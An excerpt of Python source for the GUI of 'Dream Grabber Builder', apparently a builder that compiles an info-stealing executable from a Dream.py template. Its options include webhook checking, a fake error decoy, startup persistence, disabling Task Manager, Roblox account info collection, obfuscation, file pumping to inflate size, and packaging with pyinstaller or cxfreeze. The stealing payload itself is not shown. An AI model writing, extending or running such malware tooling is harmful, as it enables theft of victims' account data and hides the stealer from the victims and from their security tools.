...
class App(customtkinter.CTk):
    def __init__(self):
        ...
        self.title("Dream Grabber Builder")
        ...
        self.logo_image = customtkinter.CTkImage(Image.open(os.path.join(image_path, "Dream.png")), size=(60, 60))
        self.large_test_image = customtkinter.CTkImage(Image.open(os.path.join(image_path, "Dream.png")), size=(500, 150))
        self.image_icon_image = customtkinter.CTkImage(Image.open(os.path.join(image_path, "Dream.png")), size=(20, 20))
        ...
        self.font = "Supernova"
        self.iconpath = None
        self.iconbitmap(f"{image_path}Dream.ico")

        self.navigation_frame = customtkinter.CTkFrame(self, corner_radius=0)
        self.navigation_frame.grid(row=0, column=0, sticky="nsew")
        self.navigation_frame.grid_rowconfigure(4, weight=1)

        self.navigation_frame_label = customtkinter.CTkLabel(self.navigation_frame, text="  Dream Grabber Builder", image=self.logo_image,
        ...
        self.checkwebhook_button = customtkinter.CTkButton(master=self.builder_frame, width=100, height=35, text="Check Webhook",
                                                           ...
                                                           fg_color="#BF0000", hover_color="#D40000", font=customtkinter.CTkFont(size=15, family=self.font))
        ...
        self.option_help = customtkinter.CTkButton(self.builder_frame, width=12, text="", image=self.help_image,
                                                   command=self.docs_button_event, fg_color="#BF0000", hover_color="#D40000")
        ...
        self.ping = customtkinter.CTkCheckBox(self.builder_frame, text="Ping", font=customtkinter.CTkFont(size=17, family=self.font),
                                              command=self.check_ping, fg_color="#BF0000", hover_color="#D40000")
        ...
        self.pingtype = customtkinter.CTkOptionMenu(
            ...
            fg_color="#BF0000", button_hover_color="#D40000", button_color="#C72828")
        ...
        self.error = customtkinter.CTkCheckBox(self.builder_frame, text="Fake Error", font=customtkinter.CTkFont(
            size=17, family=self.font), fg_color="#BF0000", hover_color="#D40000")
        ...
        self.startup = customtkinter.CTkCheckBox(
            ...
            fg_color="#BF0000", hover_color="#D40000")
        ...
        self.backupcodes = customtkinter.CTkCheckBox(
            self.builder_frame, text="DisableTaskMgr", font=customtkinter.CTkFont(size=17, family=self.font),
            fg_color="#BF0000", hover_color="#D40000")
        ...
        self.roblox = customtkinter.CTkCheckBox(self.builder_frame, text="Roblox Info", font=customtkinter.CTkFont(size=17, family=self.font),
                                                fg_color="#BF0000", hover_color="#D40000", command=self.check_roblox)
        ...
        self.obfuscation = customtkinter.CTkCheckBox(
            ...
            fg_color="#BF0000", hover_color="#D40000", command=self.check_cxfreeze)
        ...
        self.pump = customtkinter.CTkCheckBox(self.builder_frame, text="File Pumper", font=customtkinter.CTkFont(size=17, family=self.font),
                                              fg_color="#BF0000", hover_color="#D40000", command=self.check_pumper)
        ...
        self.pump_size = customtkinter.CTkOptionMenu(self.builder_frame, width=30, font=customtkinter.CTkFont(
            size=17, family=self.font), values=["5mb", "10mb", "15mb", "20mb", "25mb", "30mb"], fg_color="#BF0000", button_hover_color="#D40000", button_color="#C72828")
        ...
        self.fileopts = customtkinter.CTkOptionMenu(self.builder_frame, values=["pyinstaller", "cxfreeze", ".py"],
                                                    ...
                                                    fg_color="#BF0000", button_hover_color="#D40000", button_color="#C72828", command=self.multi_commands)
        self.fileopts.grid(row=1, column=0, sticky="nw", padx=85, pady=340)
        self.fileopts.set("File Options")

        self.icon = customtkinter.CTkButton(self.builder_frame, width=250, text="Add Icon", fg_color="#BF0000", hover_color="#D40000",
        ...
        self.build = customtkinter.CTkButton(self.builder_frame, width=250, text="Build", font=customtkinter.CTkFont(size=35, family=self.font),
                                             fg_color="#BF0000", hover_color="#D40000", command=self.buildfile)
    ...
    def reset_icon_button(self):
        self.icon.configure(self.builder_frame, width=250, text="Add Icon", fg_color="#BF0000", hover_color="#D40000",
                            font=customtkinter.CTkFont(size=33, family=self.font), command=self.get_icon)
    ...
    def reset_check_webhook_button(self):
        self.checkwebhook_button.configure(fg_color="#BF0000", hover_color="#D40000", text="Check Webhook")
    ...
    def building_button_thread(self, thread):
        while thread.is_alive():
            for i in [".", "..", "..."]:
                self.build.configure(width=250, text=f"Building{i}", font=customtkinter.CTkFont(size=35, family=self.font), fg_color="#BF0000", hover_color="#D40000")
                time.sleep(0.3)
                self.update()
    ...
    def get_config(self):
        with open(self.basefilepath + "\\Dream.py", 'r', encoding="utf-8") as f:
            code = f.read()
        ...
        if config_match:
            ...
            raise Exception("Could not find config in Dream.py")
